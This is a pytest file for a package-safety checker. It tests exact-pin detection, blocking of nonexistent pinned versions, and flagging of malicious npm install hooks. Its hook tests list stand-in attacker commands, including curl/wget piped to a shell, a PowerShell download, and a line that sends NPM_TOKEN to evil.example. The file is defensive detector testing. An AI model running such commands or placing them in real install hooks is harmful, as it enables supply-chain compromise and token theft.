"""Version checking, and the npm install-hook patterns.

Both address the same failure: the tool answered a question it had not actually
asked. `requests==99.99.99` came back "ok" because only the name was checked,
and every realistic malicious npm hook passed because the patterns were written
for source code rather than for shell commands.
"""

from __future__ import annotations

import io
import json
import tarfile

import pytest

from ghostpkg.assess import Verdict, assess, exact_pin
from ghostpkg.inspection import inspect_archive, scan_text
from ghostpkg.manifests import parse_package_json, parse_requirements
from ghostpkg.registries import PackageFacts


class TestExactPinDetection:
    """Only an exact pin can be checked. A range may be satisfied by some other
    version, so there is nothing definite to say about it."""

    @pytest.mark.parametrize(
        "specifier,expected",
        [
            ("==2.31.0", "2.31.0"),
            ("== 2.31.0", "2.31.0"),
            ("==1.0.0rc1", "1.0.0rc1"),
            (">=2.31", None),
            ("~=1.2", None),
            ("==1.2.*", None),
            ("", None),
            (None, None),
        ],
    )
    def test_pypi(self, specifier, expected):
        assert exact_pin(specifier, "pypi") == expected

    @pytest.mark.parametrize(
        "specifier,expected",
        [
            ("4.18.2", "4.18.2"),
            ("v1.2.3", "1.2.3"),
            ("1.0.0-beta.1", "1.0.0-beta.1"),
            ("^4.18.0", None),
            ("~4.18.0", None),
            (">=4", None),
            ("*", None),
            ("latest", None),
        ],
    )
    def test_npm(self, specifier, expected):
        assert exact_pin(specifier, "npm") == expected


class TestPinnedVersionMustExist:
    def facts(self, **overrides):
        base = dict(
            name="requests",
            ecosystem="pypi",
            exists=True,
            age_days=4000,
            release_count=160,
            has_repo_url=True,
            latest_version="2.34.2",
            versions=("2.31.0", "2.32.0", "2.34.2"),
        )
        base.update(overrides)
        return PackageFacts(**base)

    def test_a_version_that_does_not_exist_is_blocked(self):
        """The same class of mistake as an invented name, and just as precise:
        the registry lists every real version, so this is a lookup."""
        finding = assess(self.facts(), specifier="==99.99.99")
        assert finding.verdict is Verdict.BLOCK
        assert any("99.99.99" in reason for reason in finding.reasons)

    def test_the_reason_names_the_latest_version(self):
        finding = assess(self.facts(), specifier="==99.99.99")
        assert any("2.34.2" in reason for reason in finding.reasons)

    def test_a_real_version_passes(self):
        assert assess(self.facts(), specifier="==2.31.0").verdict is Verdict.OK

    def test_a_range_is_not_checked(self):
        """`>=2.31` may be satisfied by a version we would not think to look
        for, so there is nothing to block on."""
        assert assess(self.facts(), specifier=">=99.0").verdict is Verdict.OK

    def test_no_specifier_behaves_as_before(self):
        assert assess(self.facts()).verdict is Verdict.OK

    def test_unknown_version_list_does_not_block(self):
        """If the registry gave us no version list, we know nothing and must
        not invent a verdict."""
        finding = assess(self.facts(versions=()), specifier="==99.99.99")
        assert finding.verdict is not Verdict.BLOCK

    def test_a_missing_package_still_reports_the_name(self):
        """Non-existence outranks a version complaint."""
        finding = assess(self.facts(exists=False), specifier="==99.99.99")
        assert "does not exist on pypi" in finding.reasons


class TestSpecifiersSurviveParsing:
    def test_requirements(self):
        found = parse_requirements("requests==2.31.0\nfastapi[all]>=0.100\nnumpy\n")
        assert [(r.name, r.specifier) for r in found] == [
            ("requests", "==2.31.0"),
            ("fastapi", ">=0.100"),
            ("numpy", None),
        ]

    def test_environment_markers_are_not_part_of_the_specifier(self):
        found = parse_requirements('flask==3.0.0 ; python_version < "3.10"\n')
        assert found[0].specifier == "==3.0.0"

    def test_line_numbers_are_recorded(self):
        found = parse_requirements("# comment\n\nrequests\n")
        assert found[0].line == 3

    def test_package_json(self):
        text = json.dumps({"dependencies": {"express": "^4.18.0", "left-pad": "1.3.0"}})
        assert [(r.name, r.specifier) for r in parse_package_json(text)] == [
            ("express", "^4.18.0"),
            ("left-pad", "1.3.0"),
        ]


class TestNpmHooksAreShellCommands:
    """The original patterns were Python and JavaScript source idioms. npm
    install hooks are command lines, and every realistic malicious shape passed:
    `curl http://evil | sh` has no `curl -` flag to match on."""

    @pytest.mark.parametrize(
        "hook",
        [
            "curl http://evil.example/i.sh | sh",
            "wget -qO- http://evil.example/x | bash",
            'node -e "fetch(process.env.NPM_TOKEN)"',
            "powershell -c IWR http://evil.example/x -OutFile a.exe",
            "curl -s http://evil.example/i.sh | sh",
            "echo $NPM_TOKEN | curl -d @- http://evil.example",
        ],
    )
    def test_malicious_hooks_are_caught(self, hook):
        assert scan_text(hook, "package.json", shell=True)

    @pytest.mark.parametrize(
        "hook",
        [
            "tsc",
            "jest --ci",
            "node-gyp rebuild",
            "npm run build",
            "husky install",
            "patch-package",
            "prisma generate",
            "tsc && node dist/index.js",
            "node scripts/postbuild.js",
        ],
    )
    def test_ordinary_hooks_are_left_alone(self, hook):
        assert scan_text(hook, "package.json", shell=True) == []


class TestReferencedInstallScripts:
    """`"postinstall": "node install.js"` is the commonest shape of all, and the
    code that matters is in the file it names."""

    def tarball(self, files):
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for path, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(path)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        return buffer.getvalue()

    def test_the_referenced_script_is_read(self):
        archive = self.tarball({
            "package/package.json": json.dumps({"scripts": {"postinstall": "node install.js"}}),
            "package/install.js": 'require("child_process").execSync("id");\n',
        })
        assert [s.kind for s in inspect_archive(archive, "npm")] == ["subprocess"]

    def test_an_ordinary_build_script_stays_clean(self):
        archive = self.tarball({
            "package/package.json": json.dumps(
                {"scripts": {"postinstall": "node scripts/build.js"}}
            ),
            "package/scripts/build.js": 'const fs=require("fs");\nfs.writeFileSync("o","ok");\n',
        })
        assert inspect_archive(archive, "npm") == []

    def test_a_missing_referenced_script_is_not_an_error(self):
        archive = self.tarball({
            "package/package.json": json.dumps({"scripts": {"postinstall": "node gone.js"}}),
        })
        assert inspect_archive(archive, "npm") == []
